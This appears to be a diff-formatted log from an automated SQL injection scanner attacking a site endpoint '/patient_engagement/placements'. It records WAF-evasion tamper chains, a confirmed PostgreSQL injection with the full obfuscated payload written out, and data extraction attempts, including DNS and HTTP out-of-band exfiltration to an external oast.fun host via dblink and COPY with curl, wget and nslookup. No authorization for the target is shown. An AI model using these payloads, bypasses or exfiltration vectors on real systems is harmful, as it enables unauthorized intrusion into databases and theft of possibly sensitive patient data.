+[*] testing 'PostgreSQL standard technique' (param='X-Real-IP' req#577)
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#200 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#201)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL standard technique' (param='X-Real-IP' req#578)
+    [B-bool] [PostgreSQL] 'X-Real-IP' req#202 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[!] PCV FP-Guards PRIMARY REJECTED [B→B] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [B] PostgreSQL  continuing with next payload...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL): skipped (boolean technique (Check A already covers this mechanism))
+[*]     Check B (timing canary): SKIPPED — skipped(non-timing tech=B, no SLEEP/WAITFOR in payload)
+[*]   [PCV] Result: REJECTED  error page (400, 0B) requires timing proof, all body checks unreliable
+[*]    Wasserstein comparison probe (param='X-Real-IP' req#203)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[!] PCV FP-Guards PRIMARY REJECTED [B→B] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [B] PostgreSQL  continuing with next payload...
+[*] Collecting background surface results...
+    [DP-timing] confirmed (conf=1.00, eps=1.0)
+[*] PCV [T→B] : timing oracle surface, payload has no timing/error/UNION keyword — cross-category Boolean hit, routing to boolean FP guards (L1-L6+Welch+FPV)
+[*] Running PCV on T→B detection ()...
+[*]   [PCV] Computed exact payload on-the-fly (covers all techniques/DBMSes/surfaces)
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): PASS  via SUBSTRING (derived)+LENGTH (derived) gap=0.500
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E ( SQL): skipped (boolean technique (Check A already covers this mechanism))
+[!] PCV FP-Guards PRIMARY REJECTED [T→B]  (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [T]   continuing with next payload...
+    [DP-timing] PCV FAILED  discarding
+[*] Trying alternate HTTP methods sequentially: ['GET']
+[*] [diag-surface] scan_surface called: surface='GET:/patient_engagement/placements' params=['country']
+[+] Scanning surface: 'GET:/patient_engagement/placements' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='country' already_confirmed=False
+[*] --- testing 'country' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'country'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='country' gate_killed=False gate_circuit=False oracle=OracleMode.TIMING_ONLY techniques=ALL
+[*] Cascade engine: testing 'country'...
+[+]   [try_all] Oracle=TIMING_ONLY (WAF-blocking)  extended set includes WAF-bypass categories ST/NV/WB/EX/HY
+[+]   [try_all] Oracle=TIMING_ONLY  restricting techniques to BT,EX,ST,TH,T,WB,E,HQ,NV,HY,EH,S (was ALL)
+
+[*] ╔══════════════════════════════════════════════════════╗
+[*] ║  DBMS [1/1]: PostgreSQL   | 10 categories x 300 payloads ║
+[*] ╚══════════════════════════════════════════════════════╝
+[*] [diag] PostgreSQL base_tech_map non-empty: {'E': 2895, 'T': 2895, 'S': 2895, 'HQ': 2895, 'EH': 2895, 'TH': 2895, 'BT': 2895, 'WB': 2895, 'NV': 2895, 'EX': 2895, 'HY': 2895, 'ST': 2895}
+[*] │   Testing 12 technique codes in order: ['EH', 'ST', 'HY', 'T', 'NV', 'TH', 'WB', 'BT', 'HQ', 'EX', 'S', 'E']
+[*] ├─ [3/10] PostgreSQL › Error      │ tech=EH   │ 577 base payloads (2895 expanded)
+[*] [ISOLATE] Testing 1 keywords: AND
+[*] [ISOLATE] Could not isolate single trigger keyword
+[*] testing 'PostgreSQL header error-based' (param='country' req#579)
+[*] testing 'PostgreSQL header error-based' (param='country' req#580)
+[*] testing 'PostgreSQL header error-based' (param='country' req#581)
+[*] testing 'PostgreSQL header error-based' (param='country' req#582)
+[*] testing 'PostgreSQL header error-based' (param='country' req#583)
+[*] testing 'PostgreSQL header error-based' (param='country' req#584)
+[*] testing 'PostgreSQL header error-based' (param='country' req#585)
+[*] testing 'PostgreSQL header error-based' (param='country' req#586)
+[*] testing 'PostgreSQL header error-based' (param='country' req#587)
+[*] testing 'PostgreSQL header error-based' (param='country' req#588)
+[*] testing 'PostgreSQL header error-based' (param='country' req#589)
+[*] testing 'PostgreSQL header error-based' (param='country' req#590)
+[*] testing 'PostgreSQL header error-based' (param='country' req#591)
+[*] testing 'PostgreSQL header error-based' (param='country' req#592)
+[*] testing 'PostgreSQL header error-based' (param='country' req#593)
+[*] testing 'PostgreSQL header error-based' (param='country' req#594)
+[*] testing 'PostgreSQL header error-based' (param='country' req#595)
+[*] testing 'PostgreSQL header error-based' (param='country' req#596)
+[*] testing 'PostgreSQL header error-based' (param='country' req#597)
+[*] testing 'PostgreSQL header error-based' (param='country' req#598)
+[*] testing 'PostgreSQL header error-based' (param='country' req#599)
+    [EH-error] [PostgreSQL] req#21 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#600)
+    [EH-error] [PostgreSQL] req#22 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#601)
+    [EH-error] [PostgreSQL] req#23 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#602)
+[*] testing 'PostgreSQL header error-based' (param='country' req#603)
+[*] testing 'PostgreSQL header error-based' (param='country' req#604)
+[*] testing 'PostgreSQL header error-based' (param='country' req#605)
+[*] testing 'PostgreSQL header error-based' (param='country' req#606)
+[*] testing 'PostgreSQL header error-based' (param='country' req#607)
+[*] testing 'PostgreSQL header error-based' (param='country' req#608)
+[*] testing 'PostgreSQL header error-based' (param='country' req#609)
+[*] testing 'PostgreSQL header error-based' (param='country' req#610)
+[*] testing 'PostgreSQL header error-based' (param='country' req#611)
+[*] testing 'PostgreSQL header error-based' (param='country' req#612)
+[*] testing 'PostgreSQL header error-based' (param='country' req#613)
+[*] testing 'PostgreSQL header error-based' (param='country' req#614)
+[*] testing 'PostgreSQL header error-based' (param='country' req#615)
+[*] testing 'PostgreSQL header error-based' (param='country' req#616)
+[*] testing 'PostgreSQL header error-based' (param='country' req#617)
+    [EH-error] [PostgreSQL] req#39 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#618)
+    [EH-error] [PostgreSQL] req#40 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#619)
+    [EH-error] [PostgreSQL] req#41 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#620)
+[*] testing 'PostgreSQL header error-based' (param='country' req#621)
+[*] testing 'PostgreSQL header error-based' (param='country' req#622)
+[*] testing 'PostgreSQL header error-based' (param='country' req#623)
+[*] testing 'PostgreSQL header error-based' (param='country' req#624)
+[*] testing 'PostgreSQL header error-based' (param='country' req#625)
+[*] testing 'PostgreSQL header error-based' (param='country' req#626)
+    [EH-error] [PostgreSQL] req#48 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#627)
+[*] testing 'PostgreSQL header error-based' (param='country' req#628)
+    [EH-error] [PostgreSQL] req#50 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#629)
+[*] testing 'PostgreSQL header error-based' (param='country' req#630)
+[*] testing 'PostgreSQL header error-based' (param='country' req#631)
+    [EH-error] [PostgreSQL] req#53 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#632)
+[*] testing 'PostgreSQL header error-based' (param='country' req#633)
+[*] testing 'PostgreSQL header error-based' (param='country' req#634)
+[*] testing 'PostgreSQL header error-based' (param='country' req#635)
+[*] testing 'PostgreSQL header error-based' (param='country' req#636)
+[*] testing 'PostgreSQL header error-based' (param='country' req#637)
+[*] testing 'PostgreSQL header error-based' (param='country' req#638)
+[*] testing 'PostgreSQL header error-based' (param='country' req#639)
+[*] testing 'PostgreSQL header error-based' (param='country' req#640)
+[*] testing 'PostgreSQL header error-based' (param='country' req#641)
+    [EH-error] [PostgreSQL] req#63 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#642)
+    [EH-error] [PostgreSQL] req#64 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#643)
+[*] testing 'PostgreSQL header error-based' (param='country' req#644)
+[*] testing 'PostgreSQL header error-based' (param='country' req#645)
+[*] testing 'PostgreSQL header error-based' (param='country' req#646)
+[*] testing 'PostgreSQL header error-based' (param='country' req#647)
+[*] testing 'PostgreSQL header error-based' (param='country' req#648)
+[*] testing 'PostgreSQL header error-based' (param='country' req#649)
+[*] testing 'PostgreSQL header error-based' (param='country' req#650)
+[*] testing 'PostgreSQL header error-based' (param='country' req#651)
+[*] testing 'PostgreSQL header error-based' (param='country' req#652)
+[*] testing 'PostgreSQL header error-based' (param='country' req#653)
+[*] testing 'PostgreSQL header error-based' (param='country' req#654)
+[*] testing 'PostgreSQL header error-based' (param='country' req#655)
+[*] testing 'PostgreSQL header error-based' (param='country' req#656)
+[*] testing 'PostgreSQL header error-based' (param='country' req#657)
+    [EH-error] [PostgreSQL] req#79 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#658)
+[*] testing 'PostgreSQL header error-based' (param='country' req#659)
+[*] testing 'PostgreSQL header error-based' (param='country' req#660)
+[*] testing 'PostgreSQL header error-based' (param='country' req#661)
+[*] testing 'PostgreSQL header error-based' (param='country' req#662)
+[*] testing 'PostgreSQL header error-based' (param='country' req#663)
+[*] testing 'PostgreSQL header error-based' (param='country' req#664)
+[*] testing 'PostgreSQL header error-based' (param='country' req#665)
+[*] testing 'PostgreSQL header error-based' (param='country' req#666)
+    [EH-error] [PostgreSQL] req#88 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#667)
+    [EH-error] [PostgreSQL] req#89 status=429  WAF-blocked (skipped)
+[*] testing 'PostgreSQL header error-based' (param='country' req#668)
+    [EH-error] [PostgreSQL] req#90 status=429  WAF-blocked (skipped)
+[*] [diag] _try_technique: tech=EH dbms=PostgreSQL templates=2895 → testing 579 payloads
+[*] testing 'PostgreSQL header error-based' (param='country' req#669)
+    [EH-error] [PostgreSQL] req#91 status=429  WAF-blocked (skipped)
+[*] [TECHNIQUE-22] PostgreSQL: 16 consecutive WAF blocks — rotating to next DBMS 
+[*] ├─ [6/10] PostgreSQL › Standard   │ tech=ST   │ 577 base payloads (2895 expanded)
+[*] testing 'PostgreSQL standard technique' (param='country' req#670)
+    [B-bool] [PostgreSQL] 'country' req#92 sim=0.625 combined=0.775 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#93)
+[*] testing 'PostgreSQL standard technique' (param='country' req#671)
+[*] testing 'PostgreSQL standard technique' (param='country' req#672)
+    [B-bool] [PostgreSQL] 'country' req#95 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#96)
+[*] testing 'PostgreSQL standard technique' (param='country' req#673)
+[*] testing 'PostgreSQL standard technique' (param='country' req#674)
+    [B-bool] [PostgreSQL] 'country' req#98 sim=0.641 combined=0.784 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#99)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6662, threshold=0.25)  accepting boolean detection
+[*] Running PCV on ST→ST detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL/string): FAIL  inconsistent or no body change (0.984)
+[!] PCV FP-Guards PRIMARY REJECTED [ST→ST] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [ST] PostgreSQL  continuing with next payload...
+[!] PCV FAILED for bypass [ST] PostgreSQL  trying plain payloads...
+[*] [diag] _try_technique: tech=ST dbms=PostgreSQL templates=2895 → testing 579 payloads
+[*] testing 'PostgreSQL standard technique' (param='country' req#675)
+[*] testing 'PostgreSQL standard technique' (param='country' req#676)
+    [B-bool] [PostgreSQL] 'country' req#101 sim=0.609 combined=0.766 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#102)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6776, threshold=0.25)  accepting boolean detection
+[*] Running PCV on ST→ST detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL/string): FAIL  inconsistent or no body change (0.906)
+[!] PCV FP-Guards PRIMARY REJECTED [ST→ST] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [ST] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL standard technique' (param='country' req#677)
+    [B-bool] [PostgreSQL] 'country' req#103 sim=0.594 combined=0.756 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#104)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6783, threshold=0.25)  accepting boolean detection
+[*] Running PCV on ST→ST detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL/string): FAIL  inconsistent or no body change (0.922)
+[!] PCV FP-Guards PRIMARY REJECTED [ST→ST] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [ST] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL standard technique' (param='country' req#678)
+    [B-bool] [PostgreSQL] 'country' req#105 sim=0.625 combined=0.775 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#106)
+[*] testing 'PostgreSQL standard technique' (param='country' req#679)
+    [B-bool] [PostgreSQL] 'country' req#107 sim=0.641 combined=0.784 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#108)
+[*] testing 'PostgreSQL standard technique' (param='country' req#680)
+    [B-bool] [PostgreSQL] 'country' req#109 sim=0.641 combined=0.784 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#110)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6693, threshold=0.25)  accepting boolean detection
+[*] Running PCV on ST→ST detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (0 diffs)
+[*]     Check E (PostgreSQL SQL/numeric): FAIL  inconsistent or no body change (0.984)
+[!] PCV FP-Guards PRIMARY REJECTED [ST→ST] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [ST] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL standard technique' (param='country' req#681)
+    [B-bool] [PostgreSQL] 'country' req#111 sim=0.625 combined=0.775 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#112)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6712, threshold=0.25)  accepting boolean detection
+[*] Running PCV on ST→ST detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL/string): FAIL  inconsistent or no body change (1.000)
+[!] PCV FP-Guards PRIMARY REJECTED [ST→ST] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [ST] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL standard technique' (param='country' req#682)
+    [B-bool] [PostgreSQL] 'country' req#113 sim=0.641 combined=0.784 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#114)
+[*] testing 'PostgreSQL standard technique' (param='country' req#683)
+    [B-bool] [PostgreSQL] 'country' req#115 sim=0.641 combined=0.784 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#116)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6663, threshold=0.25)  accepting boolean detection
+[*] Running PCV on ST→ST detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL/string): FAIL  inconsistent or no body change (1.000)
+[!] PCV FP-Guards PRIMARY REJECTED [ST→ST] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [ST] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL standard technique' (param='country' req#684)
+    [B-bool] [PostgreSQL] 'country' req#117 sim=0.625 combined=0.775 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#118)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6729, threshold=0.25)  accepting boolean detection
+[*] Running PCV on ST→ST detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL/string): FAIL  inconsistent or no body change (0.422)
+[!] PCV FP-Guards PRIMARY REJECTED [ST→ST] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [ST] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL standard technique' (param='country' req#685)
+    [B-bool] [PostgreSQL] 'country' req#119 sim=0.594 combined=0.756 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#120)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6781, threshold=0.25)  accepting boolean detection
+[*] Running PCV on ST→ST detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): PASS  via SUBSTRING (structural fallback)+SUBSTRING-num gap=0.453
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): PASS  2 diffs: content-length, set-cookie
+[*]     Check E (PostgreSQL SQL/string): FAIL  inconsistent or no body change (0.844)
+[*]   [PCV] Header diff + body canary on error page (429)  unreliable, need timing...
+[!] PCV FP-Guards PRIMARY REJECTED [ST→ST] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [ST] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL standard technique' (param='country' req#686)
+    [B-bool] [PostgreSQL] 'country' req#121 sim=0.625 combined=0.775 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#122)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6632, threshold=0.25)  accepting boolean detection
+[*] Running PCV on ST→ST detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): FAIL (3 fallbacks tried)
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL/string): FAIL  inconsistent or no body change (0.375)
+[!] PCV FP-Guards PRIMARY REJECTED [ST→ST] PostgreSQL (L1-L6+Welch+FPV) — dynamic page or statistical noise, NOT confirming injection
+[!] PCV FAILED for [ST] PostgreSQL  continuing with next payload...
+[*] testing 'PostgreSQL standard technique' (param='country' req#687)
+    [B-bool] [PostgreSQL] 'country' req#123 sim=0.625 combined=0.775 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#124)
+[*] testing 'PostgreSQL standard technique' (param='country' req#688)
+    [B-bool] [PostgreSQL] 'country' req#125 sim=0.625 combined=0.775 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#126)
+[+]   [Wasserstein] dist=0.0656 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL standard technique' (param='country' req#689)
+    [B-bool] [PostgreSQL] 'country' req#127 sim=0.516 combined=0.709 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#128)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6794, threshold=0.25)  accepting boolean detection
+[*] Running PCV on ST→ST detection (PostgreSQL)...
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): PASS  via SUBSTRING+LENGTH-num gap=0.484
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): PASS  2 diffs: content-length, set-cookie
+[*]     Check E (PostgreSQL SQL/string): PASS  det+DBMS-SQL responses consistent (direct_sim=1.000)
+[*]   [PCV] Header diff + body canary on error page (429)  unreliable, need timing...
+[*]   [PCV] Result: CONFIRMED  Check A + Check E (direct_sim=1.000≥0.88) on error page (429) — SQL execution proven by E, error code not a FP signal [tech=ST dbms=PostgreSQL]
+[!] [Gate] KILL  all scanning stopped, extraction-only mode
+[+] PCV CONFIRMED [ST] PostgreSQL  injection verified!
+
+[!!] SQL injection confirmed!
+    Parameter : 'country'
+    URL       : /patient_engagement/placements?country=fr&variant=desktop
+    Technique : ST
+    DBMS      : PostgreSQL
+    Bypass    : tamper:subquery_wrap+space2plus+case_variation_extended
+    Confidence: 72%
+    Payload   : '/*X-FWD:/**/127.0.0.1*/E%((27))(/**/\t/**//**/A/**/N/**/D\t\tCHR/*CTRW*//*WDRHNT*/('
+    Requests  : 128
+
+[+] Vulnerability confirmed  param='country' technique=ST dbms=PostgreSQL
+[*] Injection confirmed on 'country'  launching extraction — all scanning stopped
+[*] [Extraction] _extraction_first running: owner=True active=True param='country'
+[*] Extraction started for 'country'
+[+] Injection found via GET method!
+[*] Running PCV on ST detection...
+[*]   [PCV] Computed exact payload on-the-fly (covers all techniques/DBMSes/surfaces)
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+[*]     Check A (body canary): PASS  via LENGTH (structural fallback)+SUBSTRING gap=0.500
+[*]     Check C (error fingerprint): FAIL (3 fallbacks tried, baseline-subtracted)
+[*]     Check D (header diff): FAIL (1 diffs)
+[*]     Check E (PostgreSQL SQL/string): FAIL  inconsistent or no body change (1.000)
+[*]     Check B (timing canary): SKIPPED — skipped(non-timing tech=ST, no SLEEP/WAITFOR in payload)
+[*]   [PCV] Result: REJECTED  error page (400, 0B) requires timing proof, all body checks unreliable
+[!] PCV FAILED for [ST]  discarding detection
+[+] [*] Skipping extended surfaces  injection already confirmed
+[*] Waiting for extraction to complete...
+[+] [V25-Extract] Inline boolean oracle wired for 'ST' (WAFBypass/Exotic/Hybrid/Standard detection) — extraction can proceed
+[+] --- Auto-extraction starting ---
+[+] [Inference] Detection payload: /*X-FWD: 127.0.0.1*/E%((27))( A N D CHR (((97)) )::IN TEGERN O%((54)) 
+[+] [Inference] DBMS: PostgreSQL | Tamper chain: ['pg_dollar_quote', 'hex_entities']
+[+] [Inference] Template (boolean-append): /*X-FWD: 127.0.0.1*/E%((27))( A N D CHR (((97)) )::IN TEGERN O%((54)) ILIKE TRIM
+[+] [Inference] No sleep value in detection payload — falling back to 0.5s
+[+] [Inference] Cleared stale progress: output/inference_progress
+[+] [Inference] Cooling down 5s before calibration...
+[+] [Inference] Calibrating with detection template (delay=0.5s)...
+[+] [Inference] CDN-cached response (149ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] Calibration 1: TRUE=394ms FALSE=413ms margin=-20ms
+[+] [Inference] CDN-cached response (150ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] CDN-cached response (146ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] Calibration 2: TRUE=394ms FALSE=399ms margin=-5ms
+[+] [Inference] Best margin: -5ms
+[+] [Inference] Hash differs but unstable (dynamic page noise: 237455B vs 237455B = 0.0%, hash changes on resend)  not a real oracle
+[+] [Inference] CDN-cached response (179ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] CDN-cached response (161ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] Hash differs but unstable (dynamic page noise: 237455B vs 237455B = 0.0%, hash changes on resend)  not a real oracle
+[+] [Inference] CDN-cached response (140ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] CDN-cached response (147ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] CDN-cached response (192ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] Hash differs but unstable (dynamic page noise: 237455B vs 237455B = 0.0%, hash changes on resend)  not a real oracle
+[+] [Inference] Boolean oracle not detected after 3 attempts
+[+] [Inference] WHERE blocked (margin=-5ms)  trying arithmetic template
+[+] [Inference] All template approaches failed — trying sleep floor before final abort
+[+] [Inference]  Threshold=396ms (margin=-5ms)
+[!] [Inference] Timing oracle UNRELIABLE: margin=5ms < min=400ms (CDN noise exceeds injection signal — timing extraction skipped)
+[+] [Inference] No boolean oracle and timing unreliable  aborting extraction (re-run with longer sleep e.g. --time-sec 2 or wait for CDN cache expiry)
+[+] [Inference] No data extracted  trying side channels
+[+] [SchemaEnumV18] Inference returned no DB name — activating SchemaEnumeratorV18 enhanced enumerator
+[!] [Extraction] Validator flagged payload (mid=114): Broken: Double dash comment missing space — sending anyway (validator is advisory only)
+[+] [_extract_int] WAF blocked >= operator 3× — auto-switching to BETWEEN
+[!] [Extraction] Validator flagged payload (mid=11): Broken: Double dash comment missing space — sending anyway (validator is advisory only)
+[+] [SideChannel] DNS OOB extraction  dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [SideChannel] Advanced DNS: dblink
+[+] [SideChannel] Advanced DNS: copy_nslookup
+[+] [SideChannel] Advanced DNS: copy_curl
+[+] [SideChannel] HTTP exfil: copy_curl
+[+] [SideChannel] HTTP exfil: copy_wget
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[+] [SideChannel] No side channels  trying DIRECT extraction before MSE
+[+] [Direct] Detection payload: /*X-FWD: 127.0.0.1*/E%((27))( A N D CHR (((97)) )::IN TEGERN
+[+] [Direct] No sleep function — skipping direct timing extraction
+[+] [Direct] Falling back to MSE timing
+[+] [Novel]  Starting 7 novel WAF bypass extraction techniques 
+[+] [Novel] Technique 1: WAF Weaponization (using WAF as boolean oracle)
+[+] [Novel-1] Sending clean baseline probe...
+[+] [Novel-1] Testing WAF trigger 1/7: <script>alert(1)</script>...
+[+] [Novel]  WAF trigger #0 skipped: TRUE400==FALSE400 (no differentiation)
+[+] [Novel] Technique 2: Micro-timing (statistical sub-threshold delays)
+[+] [Novel-2] Micro-timing sample 1/10...
+[+] [Novel-2] Micro-timing sample 6/10...
+[+] [Novel]  Micro-timing not viable (noise too high)
+[+] [Novel] Technique 3: Resource bomb (asymmetric computation)
+[+] [Novel]  Resource bomb not viable (margin=-45ms)
+[+] [Novel] Technique 4: Alternative DNS exfil vectors
+[+] [Novel] DNS vector 'dblink' fired for user  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for user  check dcxefnvzcedmzbelqrzi2mqtjwbwfczo7.oast.fun
